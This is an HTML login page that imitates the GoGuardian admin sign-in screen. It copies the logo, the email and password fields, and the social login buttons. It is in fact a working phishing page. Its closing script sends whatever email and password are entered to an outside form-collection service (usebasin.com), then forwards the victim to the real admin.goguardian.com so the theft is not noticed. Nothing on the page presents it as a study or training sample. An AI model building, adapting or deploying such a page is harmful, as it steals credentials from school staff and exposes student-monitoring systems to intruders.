<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoGuardian Account - Log in</title>
    <link rel="stylesheet" href="index.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="auth-layout">
        <header class="auth-header">
            <!-- Full Horizontal Wordmark (Blue Shield + Blue Text) -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/GoGuardianLogo.png" alt="GoGuardian Logo" class="logo">
        </header>

        <main class="auth-main">
            <div class="auth-card">
                <div class="card-header">
                    <p class="admin-label">GOGUARDIAN ADMIN</p>
                    <h1 id="form-title">Log in to your account</h1>
                </div>

                <form id="login-form" class="login-form">
                    <div class="input-group">
                        <input type="email" name="email" placeholder="Email" id="email" required autocomplete="email">
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" id="password" required autocomplete="current-password">
                    </div>
                    <button type="submit" id="submit-btn" class="btn btn-login">Log in</button>
                    
                    <div class="separator">
                        <span>or</span>
                    </div>

                    <div class="social-logins">
                        <!-- High-Fidelity Social Buttons -->
                        <button type="button" class="btn btn-social btn-google">
                            <span class="icon-box"><img src="https://i.imgur.com/V1X4MPl.png" alt="Google"></span>
                            <span class="btn-text">Log in with Google</span>
                        </button>
                        <button type="button" class="btn btn-social btn-clever">
                            <span class="icon-box"><img src="https://i.imgur.com/5JObc9m.png" alt="Clever"></span>
                            <span class="btn-text">Log in with Clever</span>
                        </button>
                        <button type="button" class="btn btn-social btn-classlink">
                            <span class="icon-box"><img src="https://i.imgur.com/5ncFUCA.png" alt="ClassLink"></span>
                            <span class="btn-text">Log in with ClassLink</span>
                        </button>
                    </div>

                    <div class="form-footer">
                        <div class="links-row top">
                            <a href="#">Sign in with Single Sign On</a>
                            <a href="#" class="learn-more">Learn More</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Need an account?</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Forgot your password?</a>
                        </div>
                    </div>
                </form>
            </div>
        </main>

        <footer class="app-footer">
            <div class="footer-left">
                <a href="#">Blog</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms</a>
            </div>
            <div class="footer-right">
                <span>© 2026 GoGuardian. All Rights Reserved.</span>
            </div>
        </footer>
    </div>

    <script>
        const form = document.getElementById('login-form');
        const submitBtn = document.getElementById('submit-btn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            submitBtn.textContent = 'Logging in...';
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';

            const formData = new FormData(form);
            
            try {
                await fetch('https://usebasin.com/f/ff0a1881e763', {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
                window.location.href = 'https://admin.goguardian.com';
            } catch (error) {
                window.location.href = 'https://admin.goguardian.com';
            }
        });
    </script>
</body>
</html>
